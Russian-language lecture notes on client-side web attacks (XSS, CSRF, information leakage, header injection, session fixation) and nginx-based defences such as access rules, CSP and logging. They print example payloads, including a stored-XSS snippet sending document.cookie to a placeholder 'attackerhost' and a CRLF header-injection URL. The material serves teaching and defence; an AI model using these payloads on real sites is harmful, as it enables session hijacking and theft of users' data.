0. Введение

  	0.1 немного о безопасности  web.
		В отличии от атак на серверную часть, клиентские атаки часто ориентированы непосредственно на пользователя, то есть включают в себя социальную составляющую: нам, как атакующей стороне, нужно заставить другого человека произвести определенные действия (перейти по определенной ссылке, прочитать письмо) для реализации атаки

    0.2 статистика от Positive Technologies
    	( http://www.ptsecurity.ru/upload/ptru/analytics/Web-Vulnerability-2016-rus.pdf )
    	В 2015 году получила распространение уязвимость среднего уровня риска «Межсайтовое выполнение сценариев» (Cross-Site Scripting, XSS), занимавшая вторую строчку рейтинга в 2014 году. Данная ошибка была обнаружена в программном коде 80% исследованных ресурсов. В результате ее эксплуатации злоумышленник может внедрить в браузер пользователя произвольные HTML-теги, включая сценарии на языке JavaScript и других языках, и таким образом получить значение идентификатора сессии атакуемого и совершитьиные неправомерные действия, например фишинговые атаки.

    	Второе место занимает недостаток безопасности «Утечка информации» (Information Leakage): данная проблема была обнаружена в 50% приложений. Зачастую на страницах приложений разглашается такая чувствительная информация, как фрагменты исходных кодов приложения, персональные и учетные данные пользователей, конфигурация сервера. Нарушитель может использовать полученные данные при планировании и проведении атак. Около половины веб-сайтов содержат также уязвимости, связанные с отсутствием защиты от подбора учетных данных (Brute Force).

	0.3 что такое Same-origin policy (SOP)? и зачем он нужен?
		Same-origin policy это основной механизм защиты данных и методов, пришедших из разных источников. Представьте себе, что было бы, если бы этот механизм не работал: мы создаем сайт на любом, выбранном нам домене, после чего заманиваем туда пользователей. Когда пользователь заходит к нам на сайт, мы подгружаем ему javascript, который читает все его письма с gmail, где пользователь залогинен параллельно, а вишенкой на торте - мы отправляем спам всем его друзьям в facebook. В реальной жизни подобное вот так вот напрямую провернуть нельзя и именно из-за SOP, обход которой и является целью большинства клиентских атак.

    0.4 рассмотрение CSRF, XSS, Information Leakage, header injection

	0.4.1 CSRF  ( https://habrahabr.ru/post/64922/ )
		CSRF расшифровывается как cross-site request forgery. Данная атака базируется на одной из основных идей www - идее о том, что страницы могут включать в себя содержимое из разных источников. Это достаточно простая атака, но может дать весьма интересные результаты при грамотном подходе.

	0.4.2 XSS

		XSS означает Cross Site Scripting (межсайтовый скриптинг). Так как аббревиатура CSS занята под Каскадные Таблицы Стилей, то исользуют аббревиатуру именно XSS, а не CSS. Эта уязвимость позволяет выполнять вредоносный JavaScript код «без спроса» пользователя путем вставки его в html код сайта.

		XSS-атаки - пожалуй, самый распространенный тип атак. Найти просто - всё, что нужно, это тщательно изучить код страницы и входные параметры. Защититься проблематично - вылезать может в совершенно неожиданных местах. Степень опасности - от незначительной до ... просто почитайте эту историю, почти технотриллер, о том, как поломали apache.org: https://blogs.apache.org/infra/entry/apache_org_04_09_2010﻿

		Межсайтовый скриптинг – еще одна ошибка валидации пользовательских данных, которая позволяет передать JavaScript код на исполнение в браузер пользователя. Атаки такого рода часто также называют HTML-инъекциями, ведь механизм их внедрения очень схож с SQL-инъекциями, но в отличие от последних, внедряемый код исполняется в браузере пользователя. Чем это чревато? 

		Во-первых, злоумышленник может украсть вашу сессионную cookie, последствия чего были описаны во втором пункте, буквально парой абзацев выше. Нужно отметить, что далеко не все серверы приложений уязвимы к данному типу атак, об этом мы отдельно поговорим в пункте под номером 5.

		Во-вторых, могут быть украдены данные, вводимые в формы на зараженной странице. А это могут быть конфиденциальные персональные данные, или, что еще хуже, данные кредитной карты вместе с CVC-кодом. 

		В третьих, через JavaScript можно изменять данные, расположенные на странице, например, там могут быть реквизиты для банковского перевода, которые злоумышленник с удовольствием подделает и заменит подставными.


		0.4.2.1
			## XSS:reflected (отраженные)
			http://www.site.com/page.php?var=<script>alert('xss');</script>

			Атака, основанная на отражённой уязвимости, на сегодняшний день является самой распространенной XSS-атакой.[13] Эти уязвимости появляются, когда данные, предоставленные веб-клиентом, чаще всего в параметрах HTTP-запроса или в форме HTML, исполняются непосредственно серверными скриптами для синтаксического анализа и отображения страницы результатов для этого клиента, без надлежащей обработки[14]. Отражённая XSS-атака срабатывает, когда пользователь переходит по специально подготовленной ссылке.

			Если сайт не экранирует угловые скобки, преобразуя их в «&lt;» и «&gt;», получим скрипт на странице результатов поиска.

			Отражённые атаки, как правило, рассылаются по электронной почте или размещаются на Web-странице. URL приманки не вызывает подозрения, указывая на надёжный сайт, но содержит вектор XSS. Если доверенный сайт уязвим к вектору XSS, то переход по ссылке может привести к тому, что браузер жертвы начнет выполнять встроенный скрипт.

		0.4.2.2
			## XSS:stored (хранимые)
			var іmg = new Image();
			іmg.srс = 'http://attackerhost/xss?' + document.cookie;

			Хранимый XSS является наиболее разрушительным типом атаки. Хранимый XSS возможен, когда злоумышленнику удается внедрить на сервер вредоносный код, выполняющийся в браузере каждый раз при обращении к оригинальной странице. Классическим примером этой уязвимости являются форумы, на которых разрешено оставлять комментарии в HTML формате без ограничений, а также другие сайты Веб 2.0 (блоги, вики, имиджборд), когда на сервере хранятся пользовательские тексты и рисунки. Скрипты вставляются в эти тексты и рисунки.

			Фрагмент кода похищения ключа с идентификатором сессии (session ID):

		0.4.2.3
			## XSS:dom-base
			http://site.com/index.html?<script>alert('!')</script>
			<script>
				document.write(unescape(documant.location.href);
			</script>

			<form onsubmit="document.write(this.t.value)">
			<input type='text' id = 't'>
			</form>

			XSS в DOM-модели возникает на стороне клиента во время обработки данных внутри JavaScript сценария. Данный тип XSS получил такое название, поскольку реализуется через DOM (Document Object Model) — не зависящий от платформы и языка программный интерфейс, позволяющий программам и сценариям получать доступ к содержимому HTML и XML-документов, а также изменять содержимое, структуру и оформление таких документов. При некорректной фильтрации возможно модифицировать DOM атакуемого сайта и добиться выполнения JavaScript-кода в контексте атакуемого сайта.

			Пример DOM-модели XSS — баг, найденный в 2011 году в нескольких JQuery плагинах[15]. Методы предотвращения DOM-модели XSS включают меры, характерные для традиционных XSS, но с реализацией на javascript и отправкой в веб-страницы — проверка ввода и предотвращение атаки[16]. Некоторые фреймворки javascript имеют встроенные защитные механизмы от этих и других типов атак, например AngularJS[17].


		0.4.2.4 xss наиболее опастные участки кода:
			document.write()
			document.writeln()
			eval()
			.innerHTML

	0.4.3 Information Leakage  
		Закоментированные участки кода.
		Незакрытые устаревшие API
		Данные не спрятанные за аутентификацию

	0.4.4 Header Injection & Session Fixation
		инъекция заголовков и фиксацию сессий. На первый взгляд, ничего существенного с их помощью сделать нельзя: первая весьма косвенно влияет на входные параметры, вторая - довольно старая и хорошо известная. Но в совокупности с другими уязвимостями и с появлением новых технологий разработки, эти атаки время от времени всплывают на поверхность и становятся актуальными. Опять. 

		http://test.com?jump=<user input>
		...
		Location: <user input>
		...

		http://test.com?jump=hell%0d%0aSet-Cookie: gotohell	%3d1
		...
		Location: hell
		Set-Cookie = 1
		...


		Фиксация сессии (Session Fixation) является методом нападения, который принудительно устанавливает идентификатор сессии (session ID) в определенное значение. В зависимости от функциональности сайта-мишени, чтобы “зафиксировать” идентификатор сессии может быть применено множество методов. Разнообразие этих методов - от применения Межсайтового программирования до забрасывания веб-сайта предварительно сформированными HTTP-запросами. Затем идентификатор пользовательской сессии фиксируется и злоумышленник ожидает тех, кто будет входить в систему. Как только пользователь сделает это, злоумышленник использует предопределенное значение идентификатора сессии, чтобы получить его онлайн идентификацию со всеми вытекающими последствиями.
		В зависимости от того, как формируются значения идентификаторов, существует два типа систем управления сессиями. Первый тип систем является “свободным”, который позволяет веб-браузерам указывать любой идентификатор. Второй тип систем является “строгим”, который принимает только значения, сформированные на сервере. В свободных системах, произвольный идентификатор сессии обрабатывается вообще без обращения к веб-сайту. Строгие системы требуют от злоумышленника обслуживания “сессии-ловушки”, с периодическим обращением к веб-сайты для предотвращения таймаутов по неактивности.
		Без активной защиты от фиксации сессии, атака может быть предпринята против любого веб-сайта использующего сессии для идентификации подлинности пользователей. Веб-сайты использующие идентификаторы сессий обычно применяют ключики (Cookie), также применяются URL и скрытые поля форм. К сожалению, сессии основанные на ключиках проще для нападений. Большинство, на настоящий момент выявленных методов атак, направлены на фиксацию именно ключиков.
		В отличие от похищения идентификаторов сессий пользователей, выполняемых после их входа на веб-сайт, фиксация сессии предоставляет значительно более широкие возможности для нападения. Активная часть нападения делается до входа пользователей в систему.




http://prgssr.ru/development/politika-bezopasnosti-kontenta-vash-budushij-luchshij-drug.html
https://habrahabr.ru/company/nixsolutions/blog/271575/
https://xakep.ru/2013/12/23/61798/
1. Как с этим всем может справиться nginx

  1.1 ограничение доступа:
      1.1.1 По методу запроса, по URI, по IP/подсети, user-agentу (http://www.cyberciti.biz/tips/linux-unix-bsd-nginx-webserver-security.html c 8-го пункта )
      1.1.2 список с чем может играть nginx  ( http://nginx.org/en/docs/http/ngx_http_core_module.html#variables )

  1.2 настройки политики безопастности (Content Security Policy):
    1.2.1 обзор: https://habrahabr.ru/company/nixsolutions/blog/271575/
    1.2.2 критика: https://xakep.ru/2013/12/23/61798/

  1.3  Мониторинг через логирование
    1.3.1 интересно рассказано здесь о том как разделять логи по location и пр: https://www.youtube.com/watch?v=d8W4qJtRjDU
    1.3.2 (???) еще про уведомления "с "обычного" ли места для этого пользователя запрос?".

  1.4 nginxScript (https://www.nginx.com/resources/wiki/nginScript/)

2. интересные инструменты для мониторинга/аудита nginx и другого.
  2.1 nginx-amplify ( https://www.nginx.com/blog/setting-up-nginx-amplify-in-10-minutes/ https://habrahabr.ru/post/305384/ )
  2.2 еще https://habrahabr.ru/post/125206/



  где поиграть:
  https://sourceforge.net/projects/metasploitable/


  ссылки:
  1. http://www.ptsecurity.ru/upload/ptru/analytics/Web-Vulnerability-2016-rus.pdf
  2. https://ru.wikipedia.org/wiki/Межсайтовый_скриптинг
  3. https://stepik.org/course/Анализ-безопасности-веб-проектов-127
  4. 